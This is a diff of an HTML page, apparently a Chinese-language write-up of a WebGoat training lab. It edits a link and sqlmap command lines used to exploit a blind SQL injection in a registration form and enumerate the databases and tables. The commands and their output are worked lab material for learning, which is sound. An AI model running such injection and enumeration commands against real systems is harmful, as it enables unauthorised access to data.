@@ -276,7 +276,7 @@ select * from users where username = '' and password = '';
 <p>如果是正常一点的思路, 我觉得这个时候应该尝试去使用自动化的工具看看这个已存在的破绽有什么继续可以利用的地方</p>
 <h4><a id="sqlmap" class="anchor" aria-hidden="true"><span class="octicon octicon-link"></span></a>sqlmap</h4>
 <p><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a><br />
-中文说明: <a href="https://www.tr0y.wang/2018/03/21/sqlmap-guide/">https://www.tr0y.wang/2018/03/21/sqlmap-guide/</a></p>
+中文说明: <a href="https://octobug.gitbooks.io/sqlmap-wiki-zhcn/content/">https://octobug.gitbooks.io/sqlmap-wiki-zhcn/content/</a></p>
 <p>先确定漏洞<br />
 将注册的 http request 放到文件中, 用 sqlmap 去扫描</p>
 <pre><code class="language-bash">python sqlmap.py -r ~/register.http
@@ -284,13 +284,13 @@ select * from users where username = '' and password = '';
 <p>sqlmap 会确定 username_reg 参数存在 boolean-based blind 漏洞<br />
 这和我们上面手工确定的信息一致</p>
 <p>再查看当前数据库和数据表</p>
-<pre><code class="language-bash">python sqlmap.py --thread 10 -r ~/register.http -p username_reg --current-db
-python sqlmap.py --thread 10 -r ~/register.http -p username_reg -D PUBLIC --tables
+<pre><code class="language-bash">python sqlmap.py  -r ~/register.http -p username_reg --current-db
+python sqlmap.py  -r ~/register.http -p username_reg -D PUBLIC --tables
 </code></pre>
 <p>这里有些奇怪, 发现 PUBLIC 库下没有表<br />
 那就爆库看看都有哪些数据库吧</p>
-<pre><code class="language-bash">python sqlmap.py --thread 10 -r ~/register.http -p username_reg --dbs
-python sqlmap.py --thread 10 -r ~/register.http -p username_reg --dbs --no-cast
+<pre><code class="language-bash">python sqlmap.py  -r ~/register.http -p username_reg --dbs
+python sqlmap.py  -r ~/register.http -p username_reg --dbs --no-cast
 </code></pre>
 <p>发现了这些数据库, 如果 PUBLIC 下面没有表的话, 莫非是在 chan9t1an 库 (webgoat 的注册账号)下?</p>
 <pre><code class="language-plain_text">[*] container
@@ -300,9 +300,9 @@ python sqlmap.py --thread 10 -r ~/register.http -p username_reg --dbs --no-cast
 [*] PUBLIC
 [*] SYSTEM_LOBS
 </code></pre>
-<pre><code class="language-bash">python sqlmap.py --thread 10 -r ~/register.http -p username_reg -D chan9t1an --tables
+<pre><code class="language-bash">python sqlmap.py  -r ~/register.http -p username_reg -D chan9t1an --tables
 
-python sqlmap.py --thread 10 -r ~/register.http -p username_reg -D chan9t1an --tables --no-cast
+python sqlmap.py  -r ~/register.http -p username_reg -D chan9t1an --tables --no-cast
 </code></pre>
 <pre><code class="language-plain_text">[11 tables]
 +-----------------------+
